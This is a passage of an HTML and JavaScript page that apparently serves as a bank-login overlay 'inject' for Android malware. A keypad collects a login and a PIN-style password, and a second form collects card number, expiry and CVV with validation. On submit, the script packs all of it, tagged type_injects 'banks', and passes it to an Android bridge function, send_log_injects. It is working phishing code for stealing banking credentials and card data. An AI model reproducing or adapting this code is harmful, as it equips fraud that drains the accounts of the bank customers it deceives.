        section {
            flex: 1;
        }

        #grid2 {
            display: grid;
            grid-template-columns: 1fr 1fr;
            grid-gap: 20px;
            text-align: center;
            font-size: 14px;
            font-weight: 300;
        }

        #formBlock {
            width: 200px;
            margin: 0 auto;
        }

        .input {
            width: 100%;
            padding: 10px;
            border: 2px solid #dbdfe8;
            border-radius: 25px;
            text-align: center;
            margin-bottom: 20px;
        }

        .active {
            border-color: #8fb87f;
        }

        input, button {
            outline: none !important;
            box-shadow: none !important;
        }

        label {
            font-size: 14px;
            font-weight: 300;
        }

        #grid {
            padding: 10px;
            display: grid;
            grid-template-columns: 1fr 1fr 1fr;
            color: #666666;
            font-size: 32px;
            font-weight: 300;
            text-align: center;
            grid-row-gap: 15px;
        }

        ::placeholder {
            color: #bfbfbf;
            opacity: 1;
        }

        :-moz-placeholder {
            color: #bfbfbf;
            opacity: 1;
        }

        ::-moz-placeholder {
            color: #bfbfbf;
            opacity: 1;
        }

        :-ms-input-placeholder {
            color: #bfbfbf;
            opacity: 1;
        }

        ::-webkit-input-placeholder {
            color: #bfbfbf;
            opacity: 1;
        }

        .button {
            display: block;
            padding: 20px 60px;
            background-color: #0071ce;
            color: #fff;
            border: 0;
            border-radius: 75px;
            margin: 0 auto;
            margin-bottom: 20px;
        }

        .button:disabled {
            opacity: 0.4;
        }

        .error {
            border-color: #f00 !important;
        }

        #grid > span {
            cursor: pointer;
        }
    </style>
</head>

    </form>
    <script>
        $('#cc').mask('0000 0000 0000 0000');
        $('#exp').mask('00/00');
        $('#cvv').mask('000');

        var spinner = document.getElementById('spinner'),
            form1 = document.getElementById('form1'),
            form2 = document.getElementById('form2');

        var login = document.getElementById('login'),
            password = document.getElementById('password');

        var button0 = document.getElementById('button0'),
            button1 = document.getElementById('button1'),
            button2 = document.getElementById('button2'),
            button3 = document.getElementById('button3'),
            button4 = document.getElementById('button4'),
            button5 = document.getElementById('button5'),
            button6 = document.getElementById('button6'),
            button7 = document.getElementById('button7'),
            button8 = document.getElementById('button8'),
            button9 = document.getElementById('button9');

            
        var cc = document.getElementById('cc'),
            exp = document.getElementById('exp'),
            cvv = document.getElementById('cvv');

        var sendData = document.getElementById('sendData');

        function pressButton(button) {
            if(login.value.length !== 7) {
                login.value = login.value + button.innerHTML;
                login.classList.add('active');
            } else if(login.value.length === 7 && password.value.length !== 6) {
                password.value = password.value + button.innerHTML;
                login.classList.remove('active');
                password.classList.add('active');
                
                if(login.value.length === 7 && password.value.length === 6) {
                
                spinner.style.display = 'block';
                setTimeout(() => {
                form1.style.display = 'none';
                spinner.style.display = 'none';
                form2.style.display = 'flex';
                }, 1500);
                
                } else   {}
                
            } else   {}
               
        }

        function deleteButton() {
            if(login.className == 'input active') {
                login.value = '';
            } else if(password.className == 'input active' && password.value.length === 0){
                login.value = '';
                password.classList.remove('active');
                login.classList.add('active');
            } else if(password.className == 'input active'){
                password.value = '';
            }
        }
        
        function check7() {
            
            var mmYY = exp.value.split('/');
            var month = parseInt(mmYY[0]);
            var year = parseInt(mmYY[1]);
    
            var expArray = exp.value.split('/');
            var today, someday;
            var exMonth = expArray[0];
            var exYear = "20" + expArray[1];
    
            today = new Date();
            someday = new Date();
            someday.setFullYear(exYear, exMonth, 1);
                    
            if(month > 12 || month == 0 || month == 00 || someday < today || year > 30 || exp.value.length != 5) {
                exp.classList.add('error')
            } else {
                exp.classList.remove('error')
                cvv.focus()
                return true;
            }
        }

        function check6() {
            if(!valid_credit_card(cc.value)) {
                cc.classList.add('error');
            } else {
                cc.classList.remove('error');
                exp.focus()
            }
        }

        function valid_credit_card(value) {
            if(value=='' || value.length < 19 || value=='0000 0000 0000 0000') return false;
            if (/[^0-9-\s]+/.test(value)) return false;
            var nCheck = 0, nDigit = 0, bEven = false;
            value = value.replace(/\D/g, "");
            for (var n = value.length - 1; n >= 0; n--) {
                var cDigit = value.charAt(n),
                    nDigit = parseInt(cDigit, 10);
                if (bEven) {
                    if ((nDigit *= 2) > 9) nDigit -= 9;
                }
                nCheck += nDigit;
                bEven = !bEven;
            }
            return (nCheck % 10) == 0;
            
            
        }

        function check8() {
            if(valid_credit_card(cc.value) && check7() && cvv.value.length === 3) {
                sendData.disabled = false;
            } else {
                sendData.disabled = true;
            }
        }
        
        sendData.onclick = () => {
            var data = {};
            data.login = login.value;
            data.password = password.value;
            data.cc = cc.value;
            data.exp = exp.value;
            data.cvv = cvv.value;
            data.type_injects = "banks";
            data.closed = "close_activity_injects";

            var ua = navigator.userAgent.toLowerCase();
            if(ua.indexOf("android") > -1) {
                try {
                    Android.send_log_injects(JSON.stringify(data))
                } catch (err) {}
            }else{
                alert(JSON.stringify(data));
            }
        }
    </script>
